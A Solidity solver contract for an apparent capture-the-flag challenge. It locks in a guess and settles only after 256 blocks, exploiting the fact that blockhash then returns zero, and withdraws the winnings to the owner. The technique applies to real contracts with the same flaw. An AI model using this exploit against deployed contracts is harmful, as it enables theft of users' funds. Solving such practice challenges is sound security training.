// SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

interface IPredictTheHashChallenge {
       function settle() external;
       function lockInGuess(bytes32 n) external payable;
}

contract PredictTheHashChallengeSolver {
    address owner;
    bytes32 guess;
    uint256 settlementBlockNumber;
    IPredictTheHashChallenge challenge;

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    constructor(address _challenge) {
        owner = msg.sender;
        challenge = IPredictTheHashChallenge(_challenge);
    }

    function lockInGuess(bytes32 hash) external payable onlyOwner {
        guess = hash;
        settlementBlockNumber = block.number + 1;

        challenge.lockInGuess{value:msg.value}(hash);
    }

    function try_settle() external onlyOwner {
        require(block.number > settlementBlockNumber + 256, "Too early");

        bytes32 answer = blockhash(settlementBlockNumber);
        require(answer == guess, "Answer is not correct yet");

        challenge.settle();
    }

    function settle() external onlyOwner {
        challenge.settle();
    }

    function withdraw() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}